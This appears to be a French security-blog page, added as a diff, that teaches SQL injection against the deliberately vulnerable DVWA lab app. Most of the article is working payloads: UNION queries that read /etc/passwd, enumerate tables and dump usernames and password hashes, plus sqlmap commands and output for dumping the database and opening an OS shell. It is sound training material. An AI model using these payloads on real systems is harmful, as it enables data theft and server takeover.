@@ -1,0 +1,463 @@
+<!DOCTYPE html>
+<html lang="fr">
+    
+    
+
+
+    <head>
+    <link href="https://gmpg.org/xfn/11" rel="profile">
+    <meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta http-equiv="Cache-Control" content="public" />
+<!-- Enable responsiveness on mobile devices -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+<meta name="generator" content="Hugo 0.78.2" />
+
+    
+    
+    
+
+<title>Web - SQLi  • LOLOLEKIK</title>
+
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Web - SQLi "/>
+<meta name="twitter:description" content="Introduction Les injections SQL permettent via une entrée utilisateur de modifier la requête envoyé à la BDD.
+Manuel Lorsqu&rsquo;on trouve une SQLI et que l&rsquo;on veut énumerer les tables il faut d&rsquo;abord savoir quels sont les colonnes afficher dans la table. Pour cela on commence par trouver le nombre de colonne de la table que l&rsquo;on requête. Pour cela on utilise l&rsquo;instruction order by pour faire un tri sur les colonnes."/>
+
+<meta property="og:title" content="Web - SQLi " />
+<meta property="og:description" content="Introduction Les injections SQL permettent via une entrée utilisateur de modifier la requête envoyé à la BDD.
+Manuel Lorsqu&rsquo;on trouve une SQLI et que l&rsquo;on veut énumerer les tables il faut d&rsquo;abord savoir quels sont les colonnes afficher dans la table. Pour cela on commence par trouver le nombre de colonne de la table que l&rsquo;on requête. Pour cela on utilise l&rsquo;instruction order by pour faire un tri sur les colonnes." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://lololekik.com/cuisine/sqli/" />
+<meta property="og:site_name" content="OffSec &amp; CO" />
+
+
+    
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/qtcreator_dark.min.css">
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/scss/hyde-hyde.816e5b26c5966343ef21f902ba05a763964deb2ae3fdcd9a954614131b756c59.css" integrity="sha256-gW5bJsWWY0PvIfkCugWnY5ZN6yrj/c2alUYUExt1bFk=">
+
+
+<link rel="stylesheet" href="/scss/print.2744dcbf8a0b2e74f8a50e4b34e5f441be7cf93cc7de27029121c6a09f9e77bc.css" integrity="sha256-J0Tcv4oLLnT4pQ5LNOX0Qb58&#43;TzH3icCkSHGoJ&#43;ed7w=" media="print">
+
+
+    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+    <script src="https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js"></script>
+    <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
+    <![endif]-->
+    <!-- Icons -->
+    <link rel="apple-touch-icon-precomposed" sizes="144x144" href="/apple-touch-icon-144-precomposed.png">
+    <link rel="shortcut icon" href="/favicon.png">
+    
+    <link rel="stylesheet" href="/css/custom.css">
+
+
+
+
+
+</head>
+
+
+    <body class=" ">
+    
+<div class="sidebar">
+  <div class="container ">
+    <div class="sidebar-about">
+      <span class="site__title">
+        <a href="http://lololekik.com/">LOLOLEKIK</a>
+      </span>
+      
+        
+        
+        
+        <div class="author-image">
+          <img src="http://lololekik.com/img/author.jpg" alt="Author Image" class="img--circle img--headshot element--center">
+        </div>
+        
+      
+      
+      <p class="site__description">
+         OffSec &amp; Co 
+      </p>
+    </div>
+    <div class="collapsible-menu">
+      <input type="checkbox" id="menuToggle">
+      <label for="menuToggle">LOLOLEKIK</label>
+      <div class="menu-content">
+        <div>
+	<ul class="sidebar-nav">
+		 
+		 
+			 
+				<li>
+					<a href="/cuisine/">
+						<span>Cuisine</span>
+					</a>
+				</li>
+			 
+		 
+			 
+				<li>
+					<a href="/exploit/">
+						<span>Exploit</span>
+					</a>
+				</li>
+			 
+		 
+			 
+				<li>
+					<a href="/network/">
+						<span>Network</span>
+					</a>
+				</li>
+			 
+		 
+			 
+				<li>
+					<a href="/writeups/">
+						<span>WriteUps</span>
+					</a>
+				</li>
+			 
+		 
+			 
+				<li>
+					<a href="/hack-the-box/">
+						<span>HackTheBox</span>
+					</a>
+				</li>
+			 
+		
+	</ul>
+</div>
+
+        <section class="social">
+	
+	
+	
+	<a href="https://github.com/LOLOLEKIK" rel="me"><i class="fab fa-github fa-lg" aria-hidden="true"></i></a>
+	
+	
+	
+	
+	
+	
+	
+	<a href="https://root-me.org/lololekik" target="blank" class="linklogo"><div class="rootme_logo logohover"> </div></a>
+	
+	
+	<a href="https://hackthebox.eu/home/users/profile/202145" target="blank" class="linklogo"><div class="hackthebox_logo logohover"> </div></a>
+	
+	
+	<a href="https://linkedin.com/in/loris-thiebaut-8b4b85197" rel="me"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a>
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	<a href="mailto:loris.thiebaut@gmail.com" rel="me"><i class="fas fa-at fa-lg" aria-hidden="true"></i></a>
+	
+</section>
+
+      </div>
+    </div>
+    
+
+<div class="builtwith">
+Built with <a href="https://gohugo.io">Hugo</a> ❤️ <a href="https://github.com/htr3n/hyde-hyde">hyde-hyde</a>.
+</div>
+
+
+  </div>
+</div>
+
+        <div class="content container">
+            
+    
+<article>
+  <header>
+    <h1>Web - SQLi </h1>
+    
+    
+<div class="post__meta">
+    
+    
+    
+    
+      
+      
+          in
+          
+          
+              <a class="badge badge-category" href="/categories/cuisine">CUISINE</a>
+              
+          
+      
+    
+    
+    
+      
+      
+          <br/>
+           <i class="fas fa-tags"></i>
+          
+          <a class="badge badge-tag" href="/tags/sqli">sqli</a>
+           
+      
+          <a class="badge badge-tag" href="/tags/enumeration">enumeration</a>
+           
+      
+          <a class="badge badge-tag" href="/tags/injection">injection</a>
+           
+      
+          <a class="badge badge-tag" href="/tags/sql">sql</a>
+           
+      
+          <a class="badge badge-tag" href="/tags/sqlmap">sqlmap</a>
+          
+      
+    
+    
+    <br/>
+    <i class="fas fa-clock"></i> 5 min read
+</div>
+
+
+  </header>
+  
+  
+  <div class="post">
+    <h1 id="introduction">Introduction</h1>
+<p>Les injections SQL permettent via une entrée utilisateur de modifier la requête envoyé à la BDD.</p>
+<h1 id="manuel">Manuel</h1>
+<p>Lorsqu&rsquo;on trouve une SQLI et que l&rsquo;on veut énumerer les tables il faut d&rsquo;abord savoir quels sont les colonnes afficher dans la table. Pour cela on commence par trouver le nombre de colonne de la table que l&rsquo;on requête. Pour cela on utilise l&rsquo;instruction <code>order by</code> pour faire un tri sur les colonnes. Lorsque nous obtenons un message d&rsquo;erreur c&rsquo;est qu&rsquo;il n&rsquo;y a plus de colonne.</p>
+
+
+
+  <img src="/img/sqli/order.png" alt="Order by sqli" class="imageformat"/>
+
+<p>Ensuite on regarde quels champs affiche quoi. Ici &ldquo;First name&rdquo; affiche la première colonne et &ldquo;Surname&rdquo; la deuxième.</p>
+
+
+
+  <img src="/img/sqli/all.png" alt="Union all sqli" class="imageformat"/>
+
+<p>Maintenant on peut contrôler ce que l&rsquo;on veut afficher et où. Par exemple ici je demande de lire un fichier à l&rsquo;emplacement 2 via la commande suivante</p>
+<pre><code>1 ' union all select 1, load_file('/etc/passwd') #
+</code></pre>
+
+
+  <img src="/img/sqli/load.png" alt="Load file sqli" class="imageformat"/>
+
+<p>Pour voire le contenu des tables il faut trouver les différentes tables et les colonnes. On commence par chercher les différentes tables.</p>
+<pre><code>1 ' union all select 1, table_name from information_schema.tables #
+</code></pre>
+
+
+  <img src="/img/sqli/schema.png" alt="information schema sqli" class="imageformat"/>
+
+<p>On choisit ensuite la table que l&rsquo;on veut pour afficher les différentes colonnes. Ici on va prendre la table users.</p>
+<pre><code>1 ' union all select 1, column_name from information_schema.columns where table_name='users' #
+</code></pre>
+
+
+  <img src="/img/sqli/col.png" alt="colonne sqli" class="imageformat"/>
+
+<p>Nous n&rsquo;avons plus qu&rsquo;à faire notre requête et bien placer les informations voulu dans les champs affichés.</p>
+<pre><code>1 ' union all select user, password from users #
+</code></pre>
+
+
+  <img src="/img/sqli/dump.png" alt="dump sqli" class="imageformat"/>
+
+<p>A partir de là on peut faire a peu près ce que l&rsquo;on veut comme écrire des fichiers via <code>into OUTFILE</code> pour s&rsquo;écrire un webshell et même s&rsquo;envoyer un reverse shell.</p>
+<h1 id="sqlmap">SQLmap</h1>
+<p>Tester un paramètre avec des cookies.</p>
+<pre><code class="language-"shell" data-lang=""shell">┌──(lololekik㉿Ashitaka)-[~/Documents/bloglololekik/content/Cuisine]
+└─$ sqlmap -u &quot;http://192.168.1.91/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit&quot; -p &quot;id&quot; --cookie=&quot;PHPSESSID=ca651b9a015b8dc13d49c11c2f3ca319;security=low&quot;                                                                           1 ⚙
+        ___
+       __H__                                                                                                                                                                                                                               
+ ___ ___[)]_____ ___ ___  {1.4.11#stable}                                                                                                                                                                                                  
+|_ -| . [']     | .'| . |                                                                                                                                                                                                                  
+|___|_  [&quot;]_|_|_|__,|  _|                                                                                                                                                                                                                  
+      |_|V...       |_|   http://sqlmap.org                                                                                                                                                                                                
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 23:47:37 /2021-01-19/
+
+[23:47:37] [INFO] resuming back-end DBMS 'mysql' 
+[23:47:37] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
+    Payload: id=1' OR NOT 4757=4757#&amp;Submit=Submit
+
+    Type: error-based
+    Title: MySQL &gt;= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: id=1' AND ROW(6856,3916)&gt;(SELECT COUNT(*),CONCAT(0x716a627871,(SELECT (ELT(6856=6856,1))),0x716a6a6b71,FLOOR(RAND(0)*2))x FROM (SELECT 8629 UNION SELECT 1982 UNION SELECT 1001 UNION SELECT 8942)a GROUP BY x)-- qHzi&amp;Submit=Submit
+
+    Type: time-based blind
+    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: id=1' AND (SELECT 6521 FROM (SELECT(SLEEP(5)))xaUT)-- GTyN&amp;Submit=Submit
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 2 columns
+    Payload: id=1' UNION ALL SELECT CONCAT(0x716a627871,0x7075416c5169527967676b5a76724474574445717a694d72774c53774b6e7649674c44496c745865,0x716a6a6b71),NULL#&amp;Submit=Submit
+---
+[23:47:37] [INFO] the back-end DBMS is MySQL
+back-end DBMS: MySQL &gt;= 4.1
+[23:47:37] [INFO] fetched data logged to text files under '/home/lololekik/.local/share/sqlmap/output/192.168.1.91'
+
+[*] ending @ 23:47:37 /2021-01-19/
+
+
+</code></pre><h2 id="sqlmap---dump">SQLMAP - Dump</h2>
+<pre><code class="language-"shell" data-lang=""shell">┌──(lololekik㉿Ashitaka)-[~/Documents/bloglololekik/content/Cuisine]
+└─$ sqlmap -u &quot;http://192.168.1.91/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit&quot; --cookie=&quot;PHPSESSID=ca651b9a015b8dc13d49c11c2f3ca319;security=low&quot; --dump                                                                        1 ⨯ 1 ⚙
+        ___
+       __H__                                                                                                                                                                                                                               
+ ___ ___[']_____ ___ ___  {1.4.11#stable}                                                                                                                                                                                                  
+|_ -| . [&quot;]     | .'| . |                                                                                                                                                                                                                  
+|___|_  [)]_|_|_|__,|  _|                                                                                                                                                                                                                  
+      |_|V...       |_|   http://sqlmap.org                                                                                                                                                                                                
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 23:50:10 /2021-01-19/
+
+[23:50:10] [INFO] resuming back-end DBMS 'mysql' 
+[23:50:10] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
+    Payload: id=1' OR NOT 4757=4757#&amp;Submit=Submit
+
+    Type: error-based
+    Title: MySQL &gt;= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: id=1' AND ROW(6856,3916)&gt;(SELECT COUNT(*),CONCAT(0x716a627871,(SELECT (ELT(6856=6856,1))),0x716a6a6b71,FLOOR(RAND(0)*2))x FROM (SELECT 8629 UNION SELECT 1982 UNION SELECT 1001 UNION SELECT 8942)a GROUP BY x)-- qHzi&amp;Submit=Submit
+
+    Type: time-based blind
+    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: id=1' AND (SELECT 6521 FROM (SELECT(SLEEP(5)))xaUT)-- GTyN&amp;Submit=Submit
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 2 columns
+    Payload: id=1' UNION ALL SELECT CONCAT(0x716a627871,0x7075416c5169527967676b5a76724474574445717a694d72774c53774b6e7649674c44496c745865,0x716a6a6b71),NULL#&amp;Submit=Submit
+---
+[23:50:10] [INFO] the back-end DBMS is MySQL
+back-end DBMS: MySQL &gt;= 4.1
+[23:50:10] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
+[23:50:10] [INFO] fetching current database
+[23:50:10] [INFO] fetching tables for database: 'dvwa'
+[23:50:10] [INFO] fetching columns for table 'guestbook' in database 'dvwa'
+[23:50:11] [WARNING] reflective value(s) found and filtering out
+[23:50:11] [INFO] fetching entries for table 'guestbook' in database 'dvwa'
+Database: dvwa
+Table: guestbook
+[1 entry]
++------------+------+-------------------------+
+| comment_id | name | comment                 |
++------------+------+-------------------------+
+| 1          | test | This is a test comment. |
++------------+------+-------------------------+
+
+[23:50:11] [INFO] table 'dvwa.guestbook' dumped to CSV file '/home/lololekik/.local/share/sqlmap/output/192.168.1.91/dump/dvwa/guestbook.csv'
+[23:50:11] [INFO] fetching columns for table 'users' in database 'dvwa'
+[23:50:11] [INFO] fetching entries for table 'users' in database 'dvwa'
+[23:50:11] [INFO] recognized possible password hashes in column 'password'
+do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] 
+do you want to crack them via a dictionary-based attack? [Y/n/q] n
+Database: dvwa
+Table: users
+[5 entries]
++---------+---------+-------------------------------------------------------+----------------------------------+-----------+------------+
+| user_id | user    | avatar                                                | password                         | last_name | first_name |
++---------+---------+-------------------------------------------------------+----------------------------------+-----------+------------+
+| 1       | admin   | http://172.16.123.129/dvwa/hackable/users/admin.jpg   | 5f4dcc3b5aa765d61d8327deb882cf99 | admin     | admin      |
+| 2       | gordonb | http://172.16.123.129/dvwa/hackable/users/gordonb.jpg | e99a18c428cb38d5f260853678922e03 | Brown     | Gordon     |
+| 3       | 1337    | http://172.16.123.129/dvwa/hackable/users/1337.jpg    | 8d3533d75ae2c3966d7e0d4fcc69216b | Me        | Hack       |
+| 4       | pablo   | http://172.16.123.129/dvwa/hackable/users/pablo.jpg   | 0d107d09f5bbe40cade3de5c71e9e9b7 | Picasso   | Pablo      |
+| 5       | smithy  | http://172.16.123.129/dvwa/hackable/users/smithy.jpg  | 5f4dcc3b5aa765d61d8327deb882cf99 | Smith     | Bob        |
++---------+---------+-------------------------------------------------------+----------------------------------+-----------+------------+
+
+[23:50:25] [INFO] table 'dvwa.users' dumped to CSV file '/home/lololekik/.local/share/sqlmap/output/192.168.1.91/dump/dvwa/users.csv'
+[23:50:25] [INFO] fetched data logged to text files under '/home/lololekik/.local/share/sqlmap/output/192.168.1.91'
+
+[*] ending @ 23:50:25 /2021-01-19/
+
+</code></pre><h2 id="sqlmap---shell">SQLMAP - Shell</h2>
+<pre><code class="language-"shell" data-lang=""shell">┌──(lololekik㉿Ashitaka)-[~/Documents/bloglololekik/content/Cuisine]
+└─$ sqlmap -u &quot;http://192.168.1.91/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit&quot; --cookie=&quot;PHPSESSID=ca651b9a015b8dc13d49c11c2f3ca319;security=low&quot; --os-shell 
+</code></pre>
+  </div>
+  
+
+<div class="navigation navigation-single">
+    
+    <a href="/cuisine/wfuzz/" class="navigation-prev">
+      <i aria-hidden="true" class="fa fa-chevron-left"></i>
+      <span class="navigation-tittle">wfuzz - Fuzzing Web </span>
+    </a>
+    
+    
+    <a href="/cuisine/lfi/" class="navigation-next">
+      <span class="navigation-tittle">Web - File Inclusion</span>
+      <i aria-hidden="true" class="fa fa-chevron-right"></i>
+    </a>
+    
+</div>
+
+
+  
+
+  
+    
+
+
+</article>
+
+
+        </div>
+        
+    
+
+<script defer src="https://use.fontawesome.com/releases/v5.11.2/js/all.js" integrity="sha384-b3ua1l97aVGAPEIe48b4TC60WUQbQaGi2jqAWM90y0OZXZeyaTCWtBTKtjW2GXG1" crossorigin="anonymous"></script>
+
+
+    
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.13.1/highlight.min.js"></script>
+        
+    <script type="text/javascript">
+        
+        hljs.initHighlightingOnLoad();
+    </script>
+    
+
+
+
+    
+
+
+
+    </body>
+</html>
